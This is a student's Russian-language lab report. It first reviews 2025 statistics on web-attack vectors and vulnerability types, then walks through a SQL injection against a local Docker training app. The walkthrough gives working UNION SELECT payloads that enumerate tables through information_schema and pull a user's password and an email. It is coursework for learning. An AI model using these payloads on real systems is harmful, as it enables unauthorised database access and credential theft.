# Лабораторная работа №1. Веб-уязвимости и SQL-инъекции

**Токарев Валерий**

---

## Часть 1. Статистика атак

### 1. Источники

- Verizon DBIR 2025 — https://www.verizon.com/business/resources/reports/2025-dbir-executive-summary.pdf
- OWASP Top 10 2025 — https://owasp.org/Top10/2025/
- IBM X-Force Threat Intelligence Index 2025 — https://www.bosconsulting.lt/reports/ibm-x-force-threat-intelligence-index-2025-report.pdf
- Positive Technologies — https://ptsecurity.com/about/news/pt-named-weaknesses-in-cyber-defense-of-companies/
- Edgescan Vulnerability Statistics Report 2025 — https://info.edgescan.com/hubfs/23DOWNLOADABLE%20CONTENT/Vulnerability%20Statistics%20Reports/Edgescan_VulnerabilityStatsReport_2025.pdf
- AionCloud Web Attack Trend Report 2025 — https://www.aioncloud.com/2025-03-web-attack-trend-report/
- Solar JSOC / RT Solar — https://rt-solar.ru/analytics/reports/5375/

---

### 2. Доля атак через веб-уязвимости

Сразу скажу — цифры у всех разные, потому что считают по-разному. Одни берут только подтверждённые утечки, другие вообще все инциденты куда попало. Поэтому смотреть на конкретное число без понимания scope смысла нет.

**Verizon DBIR 2025** — глобальная выборка, только подтверждённые breaches. Эксплуатация уязвимостей как начальный вектор — около 20%, и это +34% к прошлому году. Тут важный нюанс: в эти 20% входят не только веб-приложения, но и VPN, всякие edge-устройства на периметре. Так что реальная доля именно веба будет немного меньше.

**IBM X-Force 2025** — смотрели на критическую инфраструктуру отдельно. Там цифра повыше: 33% инцидентов начинались с эксплуатации публично доступных приложений. В каждом четвёртом кейсе — конкретно веб-уязвимость.

**Positive Technologies** — российский рынок, корпоративный сегмент. По их данным веб-уязвимости на внешнем периметре — вообще самый популярный способ войти внутрь, 36%. Это уже конкретно про веб, не про периметр в целом.

**AionCloud 2025** — эти анализировали реальный трафик атак на веб-приложения, поэтому у них другая методология. Получилось 25–38%, и чаще всего это именно SQL-инъекции.

Если коротко: от 20% до 36% в зависимости от того, кто и что считает. Чем уже фокус на веб и российский/корпоративный сегмент — тем выше цифра.

---

### 3. Распределение по типам уязвимостей

**OWASP Top 10 (2025):**

| Категория | AIR | AC | Total Occurrences |
|---|---|---|---|
| Broken Access Control | 3.74% | 42.93% | 1 839 701 |
| Security Misconfiguration | 3.00% | 52.35% | 719 084 |
| Software Supply Chain Failures | 5.72% | 27.47% | 215 248 |
| Cryptographic Failures | 3.80% | 47.74% | 1 665 348 |
| Injection | 3.08% | 42.93% | 1 404 249 |
| Insecure Design | 1.86% | 35.18% | 729 882 |
| Authentication Failures | 2.92% | 37.14% | 1 120 673 |
| Software/Data Integrity Failures | 2.75% | 45.49% | 501 327 |
| Security Logging Failures | 3.91% | 46.48% | 260 288 |
| Mishandling of Exceptional Conditions | 2.95% | 37.95% | 769 581 |

*AIR — средняя частота встречаемости в выборке приложений; AC — доля приложений, где нашли хотя бы одну такую уязвимость.*

По OWASP Injection на первый взгляд выглядит не так страшно — AIR всего 3.08%. Но это потому что OWASP считает по коду приложений, а не по реальным атакам. Если смотреть на то, что реально эксплуатируется — картина другая.

**Edgescan 2025** — данные из реальных пентестов, поэтому тут SQL-инъекции сразу выходят на первое место:

- SQL-инъекции — 19–28%
- XSS (stored) — 10–10.5%
- Загрузка вредоносных файлов — ~7%
- XSS (reflected) — ~5.5%
- Brute force — ~4.2%
- Path traversal — ~2.7%
- CSRF — ~2.1%

Расхождение между OWASP и Edgescan вполне логичное: одни смотрят на код, другие на то, что реально используют в атаках. SQLi старая уязвимость, казалось бы все знают как защищаться, но по факту до сих пор встречается чуть ли не в каждой четвёртой атаке.

---

## Часть 2. SQL-инъекция на практике

### Подготовка

Скачал Docker Desktop, создал папку, положил туда docker-compose.yml, запустил:

```
docker-compose up -d
```

Открыл `http://localhost:8080`, установил БД по ссылке на странице. Появилась форма с одним параметром — `id`.

---

### Шаг 1. Смотрю что вообще есть

Начал просто с перебора — интересно посмотреть какие пользователи есть в базе:

```
http://localhost:8080/task/?id=1   →  Ваш id:1  Ваш логин:admin
http://localhost:8080/task/?id=2   →  Ваш id:2  Ваш логин:Gordey
http://localhost:8080/task/?id=3   →  Ваш id:3  Ваш логин:Matroskin
http://localhost:8080/task/?id=4   →  Ваш id:4  Ваш логин:Vinni-pukh
...
http://localhost:8080/task/?id=9   →  Ваш id:9  Ваш логин:Volk2
http://localhost:8080/task/?id=10  →  (пусто)
```

Итого 9 пользователей. Нашёл обоих нужных: Volk2 — id=9, Vinni-pukh — id=4. Это пригодится потом.

---

### Шаг 2. Проверяю есть ли инъекция

Добавляю кавычку в конец — классический первый шаг:

```
http://localhost:8080/task/?id=1'
```

Ответ:

```
You have an error in your SQL syntax; check the manual that corresponds to your MySQL 
server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1
```

Сервер вернул голую ошибку MySQL — значит параметр подставляется в запрос напрямую, без обработки. Из текста ошибки кстати видна часть структуры запроса: `WHERE id='...' LIMIT 0,1`. Уязвимость подтверждена.

---

### Шаг 3. Определяю количество столбцов

Чтобы использовать UNION SELECT, нужно знать сколько столбцов в оригинальном запросе. Делаю через ORDER BY, бинарным поиском — быстрее чем по одному:

```
http://localhost:8080/task/?id=9' order by 10 --+  →  Unknown column '10' in 'order clause'
http://localhost:8080/task/?id=9' order by 5 --+   →  Unknown column '5' in 'order clause'
http://localhost:8080/task/?id=9' order by 4 --+   →  Unknown column '4' in 'order clause'
http://localhost:8080/task/?id=9' order by 3 --+   →  Ваш id:9  Ваш логин:Volk2
```

На 3 запрос выполнился нормально — значит столбцов ровно 3.

---

### Шаг 4. Имя базы данных

Использую несуществующий id=27, чтобы оригинальный запрос не вернул ничего и в вывод попало только то, что я добавляю через UNION:

```
http://localhost:8080/task/?id=27' AND 1=2 UNION SELECT 1,database(),3%23
→  Ваш id:1  Ваш логин:security
```

База называется `security`. Символ `%23` — это URL-кодировка `#`, комментарий в MySQL. Работает надёжнее чем `--+` в некоторых конфигурациях.

---

### Шаг 5. Список таблиц

```
http://localhost:8080/task/?id=27' AND 1=2 UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema='security'%23
→  Ваш логин:emails,users
```

Две таблицы: `emails` и `users`. Логично — пароли скорее всего в users, почты в emails.

---

### Шаг 6. Структура таблиц

Смотрю что внутри `users`:

```
http://localhost:8080/task/?id=27' AND 1=2 UNION SELECT 1,GROUP_CONCAT(column_name),3 FROM information_schema.columns WHERE table_name='users'%23
→  Ваш логин:USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password
```

Нужные столбцы — `username` и `password`.

Теперь `emails`:

```
http://localhost:8080/task/?id=27' AND 1=2 UNION SELECT 1,GROUP_CONCAT(column_name),3 FROM information_schema.columns WHERE table_name='emails'%23
→  Ваш логин:id,email_id
```

Немного неожиданное название `email_id` вместо просто `email`, но разберёмся.

---

### Шаг 7. Достаю нужные данные

**Задание 1 — пароль Volk2:**

```
http://localhost:8080/task/?id=27' AND 1=2 UNION SELECT 1,password,3 FROM users WHERE username='Volk2'%23
→  Ваш логин:Wa spoiuuuuu
```

**Задание 2 — почта Vinni-pukh:**

Vinni-pukh был id=4, нашёл ещё в самом начале при переборе. Запрашиваю из emails по этому id:

```
http://localhost:8080/task/?id=27' AND 1=2 UNION SELECT 1,email_id,3 FROM emails WHERE id=4%23
→  Ваш логин:honey_lover@otus-lab.com
```

---

### Итог

| Задание | Ответ |
|---|---|
| Пароль пользователя **Volk2** | `Wa spoiuuuuu` |
| Email пользователя **Vinni-pukh** | `honey_lover@otus-lab.com` |
